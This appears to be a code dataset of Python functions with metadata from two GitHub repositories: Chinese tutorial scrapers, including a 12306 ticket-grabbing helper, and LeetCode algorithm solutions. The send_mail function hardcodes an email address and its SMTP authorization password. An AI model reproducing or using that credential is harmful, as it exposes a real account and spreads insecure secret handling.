{"docstring": "\"\"\"\u4e0b\u8f7d\u7528\u6237\u5934\u50cf\"\"\"\n# \u62fc\u63a5\u56fe\u7247\u8def\u5f84\n", "func_signal": "def save_avatar(object_id, pictures):\n", "code": "path = os.path.join('.', object_id)\n# \u56fe\u7247\u540d\u79f0\nimg_name = 'avatar.jpg'\nimg_path = os.path.join(path, img_name)\nprint('\u5f00\u59cb\u4e0b\u8f7d\u56fe\u7247:' + img_path)\nwith open(img_path, 'wb') as img:\n    # \u4e0b\u8f7d\u56fe\u7247\n    img_re = requests.get(pictures)\n    img.write(img_re.content)\n    print('\u4e0b\u8f7d\u56fe\u7247\u5b8c\u6bd5\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u8bf7\u6c42\u6cb8\u70b9\u6570\u636e\"\"\"\n", "func_signal": "def get_poins(self):\n", "code": "request = requests.get(self.url)\n# \u5224\u65ad\u8bf7\u6c42\u7ed3\u679c\uff0c\u8fd4\u56de\u6570\u636e\nif request.status_code == 200:\n    result = request.json()\n    return result['d']['list']\nelse:\n    return []", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day13/oop_use.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u767b\u5f55\u529f\u80fd\u5b9e\u73b0\uff0c\u624b\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801\u8fdb\u884c\u767b\u5f55\"\"\"\n", "func_signal": "def do_login(self):\n", "code": "self.driver.visit(self.login_url)\nsleep(1)\n# \u9009\u62e9\u767b\u9646\u65b9\u5f0f\u767b\u9646\nprint('\u8bf7\u626b\u7801\u767b\u9646\u6216\u8005\u8d26\u53f7\u767b\u9646\u2026\u2026')\nwhile True:\n    if self.driver.url != self.init_my_url:\n        sleep(1)\n    else:\n        break", "path": "Python/12306\u62a2\u7968/new_qiangpiao_by_no_v2_test.py", "commit_date": "2019-01-15 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u521b\u5efa\u6587\u4ef6\u5939\"\"\"\n", "func_signal": "def make_dir(object_id):\n", "code": "dir_path = os.path.join('.', object_id)\n# \u5224\u65ad\u6587\u4ef6\u5939\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5219\u521b\u5efa\nexists_result = os.path.exists(dir_path)\nif not exists_result:\n    os.mkdir(dir_path)", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day19/scrapy_test/scrapy_test/middlewares.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u53d1\u9001\u90ae\u4ef6\u901a\u77e5\"\"\"\n# \u8fde\u63a5\u90ae\u7bb1\u670d\u52a1\u5668\u4fe1\u606f\n", "func_signal": "def send_mail(self, receiver_address, content):\n", "code": "host = 'smtp.163.com'\nport = 25\nsender = 'gxcuizy@163.com'  # \u4f60\u7684\u53d1\u4ef6\u90ae\u7bb1\u53f7\u7801\npwd = 'FatBoy666'  # \u4e0d\u662f\u767b\u9646\u5bc6\u7801\uff0c\u662f\u5ba2\u6237\u7aef\u6388\u6743\u5bc6\u7801\n# \u53d1\u4ef6\u4fe1\u606f\nreceiver = receiver_address\nbody = '<h2>\u6e29\u99a8\u63d0\u9192\uff1a</h2><p>' + content + '</p>'\nmsg = MIMEText(body, 'html', _charset=\"utf-8\")\nmsg['subject'] = '\u62a2\u7968\u6210\u529f\u901a\u77e5\uff01'\nmsg['from'] = sender\nmsg['to'] = receiver\ns = smtplib.SMTP(host, port)\n# \u5f00\u59cb\u767b\u9646\u90ae\u7bb1\uff0c\u5e76\u53d1\u9001\u90ae\u4ef6\ns.login(sender, pwd)\ns.sendmail(sender, receiver, msg.as_string())", "path": "Python/12306\u62a2\u7968/new_qiangpiao_by_no_v2_test.py", "commit_date": "2019-01-15 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u83b7\u53d6\u6751\u7ea7\u5730\u5740\u4fe1\u606f\"\"\"\n", "func_signal": "def get_village(self, origin_url, now_url, origin_code):\n", "code": "town_url = parse.urljoin(origin_url, now_url)\n# \u89e3\u6790\u53bf\u533a\u7684html\nprint('\u5f00\u59cb\u89e3\u6790\u6751\u7ea7\u4fe1\u606f\u2026\u2026')\nhtml = self.get_html(town_url)\nsoup = BeautifulSoup(html, 'lxml')\nvillage_list = soup.select('.villagetr')\nfor village_info in village_list:\n    a_info = village_info.find_all(name='td')\n    village_name = a_info[2].get_text()\n    village_code = a_info[0].get_text()\n    village_url = ''\n    print(village_name, village_code, village_url)\n    # \u6570\u636e\u5b58\u5165\u5b57\u5178\n    dict_info = {}\n    dict_info.update({'name': village_name})\n    dict_info.update({'code': village_code})\n    dict_info.update({'parent_code': origin_code})\n    dict_info.update({'level': 5})\n    # \u8bfb\u5199json\u6570\u636e\n    self.read_write_by_json(dict_info, 'village')\nprint('\u6751\u7ea7\u89e3\u6790\u7ed3\u675f\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u901a\u8fc7json\u683c\u5f0f\u5b58\u50a8\"\"\"\n# \u8bf7\u6c42\u6cb8\u70b9\u6570\u636e\n", "func_signal": "def save_by_json(self):\n", "code": "data = self.get_poins()\nprint('\u6cb8\u70b9json\u683c\u5f0f\u5b58\u50a8\u2026\u2026')\nwith open('poins.json', 'w') as file:\n    json.dump(data, file)\n    print('\u5b58\u50a8\u5b8c\u6bd5\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day13/oop_use.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day19/scrapy_test/scrapy_test/middlewares.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u5904\u7406\u6cb8\u70b9\u7684\u4fe1\u606f\"\"\"\n# \u5faa\u73af\u6cb8\u70b9\u5217\u8868\n", "func_signal": "def deal_poins(poins_list):\n", "code": "for poin_info in poins_list:\n    # \u6cb8\u70b9\u5bf9\u8c61ID\n    object_id = poin_info['objectId']\n    # \u521b\u5efa\u6587\u4ef6\u5939\n    make_dir(object_id)\n\n    # \u6cb8\u70b9\u5185\u5bb9\n    content = poin_info['content']\n    # \u6cb8\u70b9\u5185\u5bb9\u5b58\u5230txt\u6587\u4ef6\u4e2d\n    write_content(object_id, content)\n\n    # \u7528\u6237\u5934\u50cf\u56fe\u7247URL\n    user_avatar = poin_info['user']['avatarLarge']\n    # \u4fdd\u5b58\u7528\u6237\u5934\u50cf\n    save_avatar(object_id, user_avatar)\n\n    # \u6cb8\u70b9\u56fe\u7247\u7684list\n    pictures = poin_info['pictures']\n    # \u4fdd\u5b58\u6cb8\u70b9\u56fe\u7247\n    save_picture(object_id, pictures)", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u83b7\u53d6\u53bf\u3001\u533a\u7ea7\u5730\u5740\u4fe1\u606f\"\"\"\n", "func_signal": "def get_county(self, origin_url, now_url, origin_code):\n", "code": "city_url = parse.urljoin(origin_url, now_url)\n# \u89e3\u6790\u53bf\u533a\u7684html\nprint('\u5f00\u59cb\u89e3\u6790\u53bf/\u533a\u7ea7\u4fe1\u606f\u2026\u2026')\nhtml = self.get_html(city_url)\nsoup = BeautifulSoup(html, 'lxml')\ncounty_list = soup.select('.countytr')\nfor county_info in county_list:\n    a_info = county_info.find_all(name='a')\n    if a_info:\n        county_name = a_info[1].get_text()\n        county_code = a_info[0].get_text()\n        county_url = a_info[0].attrs['href']\n        print(county_name, county_code, county_url)\n        # \u6570\u636e\u5b58\u5165\u5b57\u5178\n        dict_info = {}\n        dict_info.update({'name': county_name})\n        dict_info.update({'code': county_code})\n        dict_info.update({'parent_code': origin_code})\n        dict_info.update({'level': 3})\n        # \u8bfb\u5199json\u6570\u636e\n        self.read_write_by_json(dict_info, 'county')\n        # \u83b7\u53d6\u4e61\u9547\u4fe1\u606f\n        self.get_town(city_url, county_url, county_code)\n    else:\n        td_info = county_info.find_all(name='td')\n        county_name = td_info[1].get_text()\n        county_code = td_info[0].get_text()\n        county_url = ''\n        print(county_name, county_code, county_url)\nprint('\u53bf/\u533a\u7ea7\u89e3\u6790\u7ed3\u675f\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u83b7\u53d6\u4e61\u9547\u5730\u5740\u4fe1\u606f\"\"\"\n", "func_signal": "def get_town(self, origin_url, now_url, origin_code):\n", "code": "county_url = parse.urljoin(origin_url, now_url)\n# \u89e3\u6790\u53bf\u533a\u7684html\nprint('\u5f00\u59cb\u89e3\u6790\u4e61\u9547\u7ea7\u4fe1\u606f\u2026\u2026')\nhtml = self.get_html(county_url)\nsoup = BeautifulSoup(html, 'lxml')\ntown_list = soup.select('.towntr')\nfor town_info in town_list:\n    a_info = town_info.find_all(name='a')\n    town_name = a_info[1].get_text()\n    town_code = a_info[0].get_text()\n    town_url = a_info[0].attrs['href']\n    print(town_name, town_code, town_url)\n    # \u6570\u636e\u5b58\u5165\u5b57\u5178\n    dict_info = {}\n    dict_info.update({'name': town_name})\n    dict_info.update({'code': town_code})\n    dict_info.update({'parent_code': origin_code})\n    dict_info.update({'level': 4})\n    # \u8bfb\u5199json\u6570\u636e\n    self.read_write_by_json(dict_info, 'town')\n    # \u83b7\u53d6\u6751\u7ea7\u4fe1\u606f\n    self.get_village(county_url, town_url, town_code)\nprint('\u4e61\u9547\u7ea7\u89e3\u6790\u7ed3\u675f\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(self, start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day19/scrapy_test/scrapy_test/middlewares.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u4e0b\u8f7d\u6cb8\u70b9\u56fe\u7247\"\"\"\n# \u62fc\u63a5\u56fe\u7247\u8def\u5f84\n", "func_signal": "def save_picture(object_id, pictures):\n", "code": "path = os.path.join('.', object_id)\nfor picture_url in pictures:\n    # \u56fe\u7247\u540d\u79f0\n    url_data = parse.urlparse(url=picture_url)\n    # \u56fe\u7247\u8bf7\u6c42\u53c2\u6570\n    url_param = parse.parse_qs(url_data.query)\n    if url_param:\n        # \u56fe\u7247\u6269\u5c55\u540d\n        img_ext = url_param['f'][0]\n        # \u56fe\u7247\u8def\u5f84\n        url_path = url_data.path\n        # \u56fe\u7247\u6807\u8bc6ID\n        img_id = os.path.split(url_path)[1]\n        # \u56fe\u7247\u540d\u79f0\n        img_name = img_id + '.' + img_ext\n        img_path = os.path.join(path, img_name)\n        print('\u5f00\u59cb\u4e0b\u8f7d\u56fe\u7247:' + img_path)\n        with open(img_path, 'wb') as img:\n            # \u4e0b\u8f7d\u56fe\u7247\n            img_re = requests.get(picture_url)\n            img.write(img_re.content)\n            print('\u4e0b\u8f7d\u56fe\u7247\u5b8c\u6bd5\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u4fdd\u5b58\u6cb8\u70b9\u5185\u5bb9\"\"\"\n# \u62fc\u63a5\u6587\u4ef6\u8def\u5f84\n", "func_signal": "def write_content(object_id, content):\n", "code": "path = os.path.join('.', object_id)\nfile_name = 'content.txt'\nfile_path = os.path.join(path, file_name)\n# \u5185\u5bb9\u5199\u5165txt\u6587\u4ef6\nprint('\u5f00\u59cb\u5199\u5165\u6587\u4ef6\uff1a' + file_path)\nwith open(file_path, 'w', encoding='utf-8') as file:\n    file.write(content)\n    print('\u5199\u5165\u5b8c\u6bd5\uff01')", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day07/juejin_poins.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u521d\u59cb\u5316\u6587\u4ef6\u5939\u6570\u636e\"\"\"\n# \u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5148\u521b\u5efa\n", "func_signal": "def init_file(self):\n", "code": "if not os.path.exists(self.json_folder):\n    os.mkdir(self.json_folder)\n# \u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u4e5f\u5148\u521d\u59cb\u5316\nfor file_name in self.json_file.values():\n    # \u521d\u59cb\u5316\u7a7a\u5217\u8868\u5199\u5165\n    file_path = os.path.join(self.json_folder, file_name)\n    if not os.path.exists(file_path):\n        with open(file_path, 'w', encoding='utf-8') as file:\n            json.dump([], file)", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\u8bfb\u5199json\u6587\u4ef6\"\"\"\n", "func_signal": "def read_write_by_json(self, data, city_type):\n", "code": "file_name = self.json_file[city_type]\nfile_path = os.path.join(self.json_folder, file_name)\n# \u8bfb\u6587\u4ef6\nwith open(file_path, 'r', encoding='utf-8') as read_file:\n    data_list = json.load(read_file)\n    data_list.append(data)\n    # \u5199\u6587\u4ef6\n    with open(file_path, 'w', encoding='utf-8') as write_file:\n        json.dump(data_list, write_file, ensure_ascii=False)", "path": "Python/\u4ece\u96f6\u5b66Python-\u6398\u91d1\u6d3b\u52a8/day16/get_city.py", "commit_date": "2020-05-07 00:00:00", "repo_name": "gxcuizy/Python", "stars": 2804, "license": "None", "language": "python", "size": 98744}
{"docstring": "\"\"\"\n:type root: TreeNode\n\"\"\"\n", "func_signal": "def __init__(self, root):\n", "code": "self.p = None\nself.stack = []\nif root:\n  self.stack.append((1, root))", "path": "lc-all-solutions/173.binary-search-tree-iterator/binary-search-tree-iterator.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type s: str\n:rtype: List[str]\n\"\"\"\n", "func_signal": "def restoreIpAddresses(self, s):\n", "code": "ans = []\nn = len(s)\n\ndef isValid(num):\n  if len(num) == 1:\n    return True\n  if len(num) > 1 and num[0] != \"0\" and int(num) <= 255:\n    return True\n  return False\n\nfor i in range(0, min(3, n - 3)):\n  a = s[:i + 1]\n  if not isValid(a):\n    break\n  for j in range(i + 1, min(i + 4, n - 2)):\n    b = s[i + 1:j + 1]\n    if not isValid(b):\n      break\n    for k in range(j + 1, min(j + 4, n - 1)):\n      c = s[j + 1:k + 1]\n      d = s[k + 1:]\n      if not isValid(c):\n        break\n      if not isValid(d):\n        continue\n      ans.append(\"{}.{}.{}.{}\".format(a, b, c, d))\nreturn ans", "path": "lc-all-solutions/093.restore-ip-addresses/restore-ip-addresses.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type nums1: List[int]\n:type nums2: List[int]\n:rtype: List[int]\n\"\"\"\n", "func_signal": "def intersection(self, nums1, nums2):\n", "code": "d = {}\nans = []\nfor num in nums1:\n  d[num] = d.get(num, 0) + 1\n\nfor num in nums2:\n  if num in d:\n    ans.append(num)\n    del d[num]\nreturn ans", "path": "lc-all-solutions/349.intersection-of-two-arrays/intersection-of-two-arrays.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type points: List[List[int]]\n:rtype: bool\n\"\"\"\n", "func_signal": "def isConvex(self, points):\n", "code": "calcDir = lambda x, y, z: (y[0] - x[0]) * (z[1] - x[1]) - (y[1] - x[1]) * (z[0] - x[0])\npre = None\nfor i in range(0, len(points) - 2):\n  x = points[i]\n  y = points[i + 1]\n  z = points[i + 2]\n  c = calcDir(x, y, z)\n  if c == 0:\n    continue\n  if pre is None:\n    pre = c\n  if pre * c < 0:\n    return False\n  pre = c\nif pre * calcDir(points[-1], points[0], points[1]) < 0:\n  return False\nif pre * calcDir(points[-2], points[-1], points[0]) < 0:\n  return False\nreturn True", "path": "lc-all-solutions/469.convex-polygon/convex-polygon.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type s: str\n:type t: str\n:rtype: str\n\"\"\"\n", "func_signal": "def findTheDifference(self, s, t):\n", "code": "sum1 = sum(map(ord, [c for c in s]))\nsum2 = sum(map(ord, [c for c in t]))\nreturn chr(sum2 - sum1)", "path": "lc-all-solutions/389.find-the-difference/find-the-difference.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type n: int\n:rtype: List[List[int]]\n\"\"\"\n", "func_signal": "def generateMatrix(self, n):\n", "code": "ans = [[0] * n for _ in range(n)]\nleft, right, up, down = 0, n - 1, 0, n - 1\nk = 1\nwhile left <= right and up <= down:\n  for i in range(left, right + 1):\n    ans[up][i] = k\n    k += 1\n  up += 1\n  for i in range(up, down + 1):\n    ans[i][right] = k\n    k += 1\n  right -= 1\n  for i in reversed(range(left, right + 1)):\n    ans[down][i] = k\n    k += 1\n  down -= 1\n  for i in reversed(range(up, down + 1)):\n    ans[i][left] = k\n    k += 1\n  left += 1\nreturn ans", "path": "lc-all-solutions/059.spiral-matrix-ii/spiral-matrix-ii.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type coins: List[int]\n:type amount: int\n:rtype: int\n\"\"\"\n\n", "func_signal": "def coinChange(self, coins, amount):\n", "code": "dp = [float(\"inf\")] * (amount + 1)\ndp[0] = 0\nfor i in range(1, amount + 1):\n  for coin in coins:\n    if i - coin >= 0:\n      dp[i] = min(dp[i], dp[i - coin] + 1)\nreturn dp[-1] if dp[-1] != float(\"inf\") else -1", "path": "lc-all-solutions/322.coin-change/coin-change.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type s: str\n:rtype: int\n\"\"\"\n", "func_signal": "def minCut(self, s):\n", "code": "pal = [[False for j in range(0, len(s))] for i in range(0, len(s))]\ndp = [len(s) for _ in range(0, len(s) + 1)]\nfor i in range(0, len(s)):\n  for j in range(0, i + 1):\n    if (s[i] == s[j]) and ((j + 1 > i - 1) or (pal[i - 1][j + 1])):\n      pal[i][j] = True\n      dp[i + 1] = min(dp[i + 1], dp[j] + 1) if j != 0 else 0\nreturn dp[-1]", "path": "lc-all-solutions/132.palindrome-partitioning-ii/palindrome-partitioning-ii.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type n: int\n:rtype: int4\n\"\"\"\n", "func_signal": "def countNumbersWithUniqueDigits(self, n):\n", "code": "if n <= 1:\n  return 10 ** n\ndp = [0] * (n + 1)\ndp[0] = 0\ndp[1] = 9\nk = 9\nfor i in range(2, n + 1):\n  dp[i] = max(dp[i - 1] * k, 0)\n  k -= 1\nreturn sum(dp) + 1", "path": "lc-all-solutions/357.count-numbers-with-unique-digits/count-numbers-with-unique-digits.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"Decodes your encoded data to tree.\n\n:type data: str\n:rtype: TreeNode\n\"\"\"\n", "func_signal": "def deserialize(self, data):\n", "code": "left = lambda n: 2 * n + 1\nright = lambda n: 2 * n + 2\ndata = data.split(\",\")\nif data[0] == \"None\":\n  return None\nroot = TreeNode(int(data[0]))\nqueue = deque([root])\ni = 0\nwhile queue and i < len(data):\n  top = queue.popleft()\n  i += 1\n  left = right = None\n  if i < len(data) and data[i] != \"None\":\n    left = TreeNode(int(data[i]))\n    queue.append(left)\n  i += 1\n  if i < len(data) and data[i] != \"None\":\n    right = TreeNode(int(data[i]))\n    queue.append(right)\n\n  top.left = left\n  top.right = right\n\nreturn root", "path": "lc-all-solutions/297.serialize-and-deserialize-binary-tree/serialize-and-deserialize-binary-tree.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\ninitialize your data structure here.\n:type matrix: List[List[int]]\n\"\"\"\n", "func_signal": "def __init__(self, matrix):\n", "code": "self.dp = [[0] * len(matrix[0]) for i in range(0, len(matrix))]\nfor i in range(0, len(matrix)):\n  for j in range(0, len(matrix[0])):\n    if i == 0:\n      self.dp[0][j] = self.dp[0][j - 1] + matrix[i][j]\n    elif j == 0:\n      self.dp[i][0] = self.dp[i - 1][0] + matrix[i][j]\n    else:\n      self.dp[i][j] = self.dp[i - 1][j] + self.dp[i][j - 1] - self.dp[i - 1][j - 1] + matrix[i][j]", "path": "lc-all-solutions/304.range-sum-query-2d-immutable/range-sum-query-2d-immutable.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:rtype: int\n\"\"\"\n", "func_signal": "def next(self):\n", "code": "stack = self.stack\nwhile stack:\n  p = stack.pop()\n  if not p[1]:\n    continue\n  if p[0] == 0:\n    return p[1].val\n  else:\n    l = []\n    if p[1].right:\n      l.append((1, p[1].right))\n    l.append((0, p[1]))\n    if p[1].left:\n      l.append((1, p[1].left))\n    stack.extend(l)", "path": "lc-all-solutions/173.binary-search-tree-iterator/binary-search-tree-iterator.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type root: TreeNode\n:type p: TreeNode\n:type q: TreeNode\n:rtype: TreeNode\n\"\"\"\n", "func_signal": "def lowestCommonAncestor(self, root, p, q):\n", "code": "a, b = sorted([p.val, q.val])\nwhile not a <= root.val <= b:\n  if a > root.val:\n    root = root.right\n  else:\n    root = root.left\nreturn root", "path": "lc-all-solutions/235.lowest-common-ancestor-of-a-binary-search-tree/lowest-common-ancestor-of-a-binary-search-tree.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\nsum of elements matrix[(row1,col1)..(row2,col2)], inclusive.\n:type row1: int\n:type col1: int\n:type row2: int\n:type col2: int\n:rtype: int\n\"\"\"\n", "func_signal": "def sumRegion(self, row1, col1, row2, col2):\n", "code": "dp = self.dp\n\ndiagSum = dp[row1 - 1][col1 - 1]\ntotalSum = dp[row2][col2]\nleftSum = dp[row2][col1 - 1]\nupSum = dp[row1 - 1][col2]\nif row1 == 0:\n  upSum = 0\n  diagSum = 0\nif col1 == 0:\n  leftSum = 0\n  diagSum = 0\nreturn totalSum - leftSum - upSum + diagSum", "path": "lc-all-solutions/304.range-sum-query-2d-immutable/range-sum-query-2d-immutable.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type head: ListNode\n:rtype: bool\n\"\"\"\n", "func_signal": "def hasCycle(self, head):\n", "code": "fast = slow = head\nwhile fast and fast.next:\n  fast = fast.next.next\n  slow = slow.next\n  if slow == fast:\n    return True\nreturn False", "path": "lc-all-solutions/141.linked-list-cycle/linked-list-cycle.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type A: List[int]\n:rtype: int\n\"\"\"\n", "func_signal": "def maxRotateFunction(self, A):\n", "code": "if not A:\n  return 0\n\nsumA = sum(A)\nfk = 0\nn = len(A)\nfor i, num in enumerate(A):\n  fk += i * num\nidx = n - 1\nans = float(\"-inf\")\nfor _ in range(n):\n  fk += sumA - n * A[idx]\n  ans = max(ans, fk)\n  idx -= 1\nreturn ans", "path": "lc-all-solutions/396.rotate-function/rotate-function.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"Encodes a tree to a single string.\n\n:type root: TreeNode\n:rtype: str\n\"\"\"\n", "func_signal": "def serialize(self, root):\n", "code": "ret = []\nqueue = deque([root])\nwhile queue:\n  top = queue.popleft()\n  if not top:\n    ret.append(\"None\")\n    continue\n  else:\n    ret.append(str(top.val))\n  queue.append(top.left)\n  queue.append(top.right)\nreturn \",\".join(ret)", "path": "lc-all-solutions/297.serialize-and-deserialize-binary-tree/serialize-and-deserialize-binary-tree.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type org: List[int]\n:type seqs: List[List[int]]\n:rtype: bool\n\"\"\"\n", "func_signal": "def sequenceReconstruction(self, org, seqs):\n", "code": "n = len(org)\ngraph = collections.defaultdict(list)\nvisited = {}\nincomings = collections.defaultdict(int)\nnodes = set()\nfor seq in seqs:\n  nodes |= set(seq)\n  if len(seq) > 0:\n    incomings[seq[0]] += 0\n  for i in range(0, len(seq) - 1):\n    start, end = seq[i], seq[i + 1]\n    graph[start].append(end)\n    incomings[end] += 1\n\ncount = 0\nfor node in incomings:\n  if incomings[node] == 0:\n    count += 1\n    if count == 2:\n      return False\norder = []\nvisited = collections.defaultdict(int)\nqueue = [q for q in incomings if incomings[q] == 0]\nwhile len(queue) == 1:\n  top = queue.pop()\n  order.append(top)\n  for nbr in graph[top]:\n    incomings[nbr] -= 1\n    if incomings[nbr] == 0:\n      queue.append(nbr)\nif len(queue) > 1:\n  return False\nif order == org and len(order) == len(nodes):\n  return True\nreturn False", "path": "lc-all-solutions/444.sequence-reconstruction/sequence-reconstruction.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
